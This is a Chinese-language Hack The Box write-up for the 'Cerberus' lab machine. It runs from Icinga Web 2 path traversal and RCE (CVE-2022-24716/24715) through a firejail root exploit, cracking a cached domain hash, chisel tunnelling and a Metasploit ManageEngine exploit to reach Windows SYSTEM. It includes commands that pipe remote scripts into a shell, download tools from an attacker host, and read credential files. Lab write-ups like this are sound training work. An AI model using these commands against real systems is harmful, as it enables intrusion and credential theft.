# 信息搜集

TCP 扫端口，扫了两次都没扫到，第三次才扫到了有 8080 端口

    ~/Hackthebox-writeups/Hackthebox-Cerberus -------------------- 255 13:30:39 > sudo nmap -sT -sV -O -p8080 10.10.11.205
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-09 13:30 CST
    Nmap scan report for 10.10.11.205
    Host is up (0.27s latency).
    PORT STATE SERVICE VERSION
    8080/tcp open http Apache httpd 2.4.52 ((Ubuntu))
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Linux 5.X|4.X (93%)
    OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4
    Aggressive OS guesses: Linux 5.0 (93%), Linux 4.15 - 5.6 (85%)
    No exact OS matches for host (test conditions non-ideal).
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 19.54 seconds

换成 UDP 试试

    ~/Hackthebox-writeups/Hackthebox-Cerberus ------------------------ 13:20:17
    > sudo nmap --min-rate 10000 -p- -Pn -sU 10.10.11.205
    [sudo] password for tel:
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-09 13:20 CST
    Nmap scan report for 10.10.11.205
    Host is up (0.28s latency).
    Not shown: 65534 open|filtered udp ports (no-response)
    PORT   STATE SERVICE
    53/udp open  domain

    Nmap done: 1 IP address (1 host up) scanned in 16.25 seconds

扫到 53 端口，接下来查看具体服务

    ~/Hackthebox-writeups/Hackthebox-Cerberus -------------------- INT 13:22:22
    > sudo nmap -sU -sV -O -p53 10.10.11.205
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-09 13:22 CST
    Nmap scan report for 10.10.11.205
    Host is up (0.27s latency).

    PORT   STATE SERVICE VERSION
    53/udp open  domain?
    Too many fingerprints match this host to give specific OS details

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 107.95 seconds

貌似也没什么东西

那就直接访问 8080 端口，看到跳转到域名 icinga.cerberus.local，那么在 hosts 文件里加上

加上之后，再进行访问，可以看到 8080 端口的 web 界面

# Web 渗透

![](https://i.328888.xyz/2023/04/09/icHGEb.png)

能看到开源框架是 **Icinga Web 2**，上网查一查漏洞，发现在 2022 年爆出了一个**任意文件读取漏洞 CVE-2022-24716 和 RCE 漏洞 CVE-2022-24715**

[https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/](https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/)

curl 一下看看

```shell
~/Hackthebox-writeups/Hackthebox-Cerberus --------------------------------------- 13:42:52
> sudo curl -v 'http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/passwd'
*   Trying 10.10.11.205:8080...
* Connected to icinga.cerberus.local (10.10.11.205) port 8080 (#0)
> GET /icingaweb2/lib/icinga/icinga-php-thirdparty/etc/passwd HTTP/1.1
> Host: icinga.cerberus.local:8080
> User-Agent: curl/7.88.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Sun, 09 Apr 2023 05:43:00 GMT
< Server: Apache/2.4.52 (Ubuntu)
< Cache-Control: public, max-age=1814400, stale-while-revalidate=604800
< Etag: 4019d-6b5-5f361871179c0
< Last-Modified: Sun, 29 Jan 2023 06:51:27 GMT
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/plain;charset=UTF-8
<
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
matthew:x:1000:1000:matthew:/home/matthew:/bin/bash
ntp:x:108:113::/nonexistent:/usr/sbin/nologin
sssd:x:109:115:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
nagios:x:110:118::/var/lib/nagios:/usr/sbin/nologin
redis:x:111:119::/var/lib/redis:/usr/sbin/nologin
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
icingadb:x:999:999::/etc/icingadb:/sbin/nologin
* Connection #0 to host icinga.cerberus.local left intact
```

好，任意文件读取是成功的

文章中说道可以读取相关的配置文件

![](https://i.328888.xyz/2023/04/09/icOEJ5.png)

1. config.ini

```shell
~/Hackthebox-writeups/Hackthebox-Cerberus ------------------------ 13:57:00
> sudo curl 'http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/config.ini'
[global]
show_stacktraces = "1"
show_application_state_messages = "1"
config_backend = "db"
config_resource = "icingaweb2"
module_path = "/usr/share/icingaweb2/modules/"

[logging]
log = "syslog"
level = "ERROR"
application = "icingaweb2"
facility = "user"

[themes]

[authentication]
```

2. resources.ini

```shell
~/Hackthebox-writeups/Hackthebox-Cerberus --------------------- 4s 13:57:04
> sudo curl 'http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini'
[icingaweb2]
type = "db"
db = "mysql"
host = "localhost"
dbname = "icingaweb2"
username = "matthew"
password = "IcingaWebPassword2023"
use_ssl = "0"
```

3. roles.ini

```shell
~/Hackthebox-writeups/Hackthebox-Cerberus ------------------------ 13:58:39
> sudo curl 'http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/roles.ini'
[Administrators]
users = "matthew"
permissions = "*"
groups = "Administrators"
unrestricted = "1"
```

4. authentication.ini

```shell
~/Hackthebox-writeups/Hackthebox-Cerberus ------------------------ 13:59:29
> sudo curl 'http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/authentication.ini'
[icingaweb2]
backend = "db"
resource = "icingaweb2"
```

这几个文件的读取中，就看到了数据库的账号密码，现在测试一下登录界面能不能用这个账号密码进行登录吧

`matthew/IcingaWebPassword2023`

好啊，登录成功

![](https://i.328888.xyz/2023/04/09/icOKDJ.png)

接下来使用的 **CVE-2022-24715** 漏洞来 RCE

使用 github exploit 脚本: [https://raw.githubusercontent.com/JacobEbben/CVE-2022-24715/main/exploit.py](https://raw.githubusercontent.com/JacobEbben/CVE-2022-24715/main/exploit.py)

![](https://i.328888.xyz/2023/04/09/icOQ1d.png)

同时需要本地生成 pem 密钥: `ssh-keygen -t rsa -m PEM`

![](https://i.328888.xyz/2023/04/09/icjSpX.png)

# 提权

    www-data@icinga:/usr/share$ find / -user root -perm -4000 -print 2>/dev/null
    find / -user root -perm -4000 -print 2>/dev/null
    /usr/sbin/ccreds_chkpwd
    /usr/bin/mount
    /usr/bin/sudo
    /usr/bin/firejail
    /usr/bin/chfn
    /usr/bin/fusermount3
    /usr/bin/newgrp
    /usr/bin/passwd
    /usr/bin/gpasswd
    /usr/bin/ksu
    /usr/bin/pkexec
    /usr/bin/chsh
    /usr/bin/su
    /usr/bin/umount
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/openssh/ssh-keysign
    /usr/libexec/polkit-agent-helper-1

## capsh

输出 docker 里面已有 capabilities 权限的用户

    www-data@icinga:/usr/share$ capsh --print
    capsh --print
    Current: =
    Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
    Ambient set =
    Current IAB:
    Securebits: 00/0x0/1'b0
     secure-noroot: no (unlocked)
     secure-no-suid-fixup: no (unlocked)
     secure-keep-caps: no (unlocked)
     secure-no-ambient-raise: no (unlocked)
    uid=33(www-data) euid=33(www-data)
    gid=33(www-data)
    groups=33(www-data),121(icingaweb2)
    Guessed mode: UNCERTAIN (0)

`unshare -Urm` 克隆一个 root 用户

![](https://i.328888.xyz/2023/04/09/ic8IJX.png)

获得一个 nogroup 用户，无法进入 root 和普通用户的文件夹

## firejail

[firejail: local root exploit reachable via --join logic (CVE-2022-31214): https://seclists.org/oss-sec/2022/q2/188](https://seclists.org/oss-sec/2022/q2/188)

![](https://i.328888.xyz/2023/04/09/iccAaF.png)

拿到完整的 root 权限，但依然没有发现 flag

# 域控

查看 ip 信息

    root@icinga:/home/matthew# ifconfig
    ifconfig
    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
            inet 172.16.22.2  netmask 255.255.255.240  broadcast 172.16.22.15
            inet6 fe80::215:5dff:fe5f:e801  prefixlen 64  scopeid 0x20<link>
            ether 00:15:5d:5f:e8:01  txqueuelen 1000  (Ethernet)
            RX packets 13136  bytes 2010699 (2.0 MB)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 12271  bytes 8455620 (8.4 MB)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

    lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
            inet 127.0.0.1  netmask 255.0.0.0
            inet6 ::1  prefixlen 128  scopeid 0x10<host>
            loop  txqueuelen 1000  (Local Loopback)
            RX packets 13052  bytes 998768 (998.7 KB)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 13052  bytes 998768 (998.7 KB)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

## LinPEAS

安装

```shell
# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Local network
sudo python -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

```

![](https://i.328888.xyz/2023/04/12/iXO5gV.png)

## 信息搜集 + 密码破解

读取了一个奇怪的文件，然后反弹 shell 拿到的终端就炸掉了、、、、、、

![](https://i.328888.xyz/2023/04/12/iXOM6x.png)

读取 /etc/hosts

    root@icinga:/var/lib/sss/db# cat /etc/hosts
    cat /etc/hosts
    127.0.0.1 iceinga.cerberus.local iceinga
    127.0.1.1 localhost
    172.16.22.1 DC.cerberus.local DC cerberus.local

    # The following lines are desirable for IPv6 capable hosts
    ::1     ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters

发现域控主机: **172.16.22.1 DC.cerberus.local DC cerberus.local**

### SSSD

> 因为有域的存在，检查 SSSD，目录在 `/var/lib/sss/db`（SSSD 是一种常见的 Linux 系统服务，提供了与 LDAP，Kerberos 和其他身份验证和授权服务的集成。
>
> SSSD 提供了一种缓存机制，可以将身份验证和授权数据缓存在本地计算机上，以便在进行身份验证和授权时更快地访问这些数据。）

查看 SSSD 配置文件: `/etc/sssd/sssd.conf`

    root@icinga:/var/lib/sss/db# cat /etc/sssd/sssd.conf
    cat /etc/sssd/sssd.conf

    [sssd]
    domains = cerberus.local
    config_file_version = 2
    services = nss, pam

    [domain/cerberus.local]
    default_shell = /bin/bash
    ad_server = cerberus.local
    krb5_store_password_if_offline = True
    cache_credentials = True
    krb5_realm = CERBERUS.LOCAL
    realmd_tags = manages-system joined-with-adcli
    id_provider = ad
    fallback_homedir = /home/%u@%d
    ad_domain = cerberus.local
    use_fully_qualified_names = True
    ldap_id_mapping = True
    access_provider = ad

### 搜索有用文件

    root@icinga:/var/lib/sss/db# strings cache_cerberus.local.ldb
    ......
    ......
    name=matthew@cerberus.local,cn=users,cn=cerberus.local,cn=sysdb
    ......
    cachedPassword
    $6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
    ......
    cachedPassword
    $6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0

使用 john 破解 hash: **matthew/147258369**

![](https://i.328888.xyz/2023/04/12/iXjFkN.png)

## 内网隧道 chisel 转发端口

**使用一行命令可以简单的探测端口**

```shell
(echo '' > /dev/tcp/172.16.22.1/5985) 2>/dev/null && echo "[+] Puerto abierto"
```

当然，也可以上传 **fscan** 工具对域控机器进行端口扫描

```shell
./fscan -h 172.16.22.1/24
./fscan -h 172.16.22.1 -nobr -p 1-65535
```

**存在 5985 端口，也就是 evil-winrm 工具攻击的端口**

搭建内网隧道工具，代理出内网中 172.16.22.1 主机 5985 端口

```shell
# 靶机
./chisel client 10.10.16.2:7777 R:5985:172.16.22.1:5985

# kali
./chisel_1.8.1_linux_386 server --reverse -p 7777
```

![](https://i.328888.xyz/2023/04/12/iX8y0H.png)

之后使用工具连接获取域控权限: `sudo evil-winrm -i 10.10.16.2 -u matthew -p '147258369'`

![](https://i.328888.xyz/2023/04/12/iX8l1A.png)

获取 user.txt

![](https://i.328888.xyz/2023/04/12/iX8SKQ.png)

# window 域控提权

## window 端口

**命令行扫描端口（慢）**

```shell
1..10000 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.11.205",$_)) "Port $_ is open!"} 2>$null
```

命令行查看端口（快）

```shell
netstat -ano | findstr "LISTENING"
```

## 内网隧道 chisel 转发端口

```shell
# 上传 chisel
curl 10.10.16.2/chiselamd64.exe -o chisel.exe

# 靶机上执行
./chisel.exe client 10.10.16.2:1111 R:1080:socks
# kali 上执行
./chisel_1.8.1_linux_386 server --reverse -p 1111
```

kali 机器走 127.0.0.1:1111 socket5 代理，即可访问域控服务

![](https://i.328888.xyz/2023/04/15/i7r6Eq.png)

访问 172.16.22.1:8888 端口自动跳转到 9251 端口，之后又会跳转到 dc.cerberus.local

![](https://i.328888.xyz/2023/04/15/i7rdkw.png)

之后使用之前登陆这台 window 机器的密码 **matthew\@cerberus.local/147258369** 可以在这个页面进行登录，**算是一种密码重用吧**

登录后，仍会跳转到 [https://dc:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f](https://dc:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f)

![](https://i.328888.xyz/2023/04/15/i73feP.png)

## ManageEngine ADSelfService Plus

ManageEngine ADSelfService Plus 默认端口是 9251

到此为止，我们知道了这里的服务是 windows 的 ADSelfService，还有一个 guid:67a8d101690402dc6a6744b8fc8a7ca1acf88b2f，可以搜索相关 CVE 漏洞

![](https://i.328888.xyz/2023/04/15/i7RMm8.png)

![](https://i.328888.xyz/2023/04/15/i7csrA.png)

不过 searchsploit 搜到的几个都用不上，要用 msf 的 payload 才行、、、、、、

## 学习学习 msf 用法

使用 payload2，之后执行 `options` 查看需要配置的参数

![](https://i.328888.xyz/2023/04/15/i7cYAa.png)

       Name         Current Setting  Required  Description
       ----         ---------------  --------  -----------
       GUID                          yes       The SAML endpoint GUID
       ISSUER_URL                    yes       The Issuer URL used by the Identity Provider which has been configured as the SAML authentication provider for the target server
       Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
       RELAY_STATE                   no        The Relay State. Default is "http(s)://<rhost>:<rport>/samlLogin/LoginAuth"
       RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
       RPORT        9251             yes       The target port (TCP)
       SSL          true             no        Negotiate SSL/TLS for outgoing connections
       SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
       TARGETURI    /samlLogin       yes       The SAML endpoint URL
       URIPATH                       no        The URI to use for this exploit (default is random)
       VHOST                         no        HTTP server virtual host

msf 配置此 payload 相关参数

```shell
set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
set ISSUER_URL http://dc.cerberus.local/adfs/services/trust
set RHOSTS 172.16.22.1
set RPORT 9251
set LHOST 10.10.16.2
set ReverseAllowProxy true
set AutoCheck false
set proxies socks5:127.0.0.1:1080
run
> shell
C:\Program Files (x86)> whoami
nt authority\system
C:\Program Files (x86)> type c:\Users\Administrator\Desktop\root.txt
f*******************************
```

![](https://i.328888.xyz/2023/04/15/i77IUb.png)

---

# reference

- https://www.0le.cn/archives/59.html
- https://blog.csdn.net/qq_58869808/article/details/129786875
- https://www.ngui.cc/article/show-1006958.html?action=onClick

# 使用工具

- CVE-2022-24715
- capsh + unshare -Urm (docker)
- LinPEAS
- john
- chisel 内网隧道
- fscan 内网扫描
- evil-winrm
- netstat -ano | findstr "LISTENING"
- msfconsole
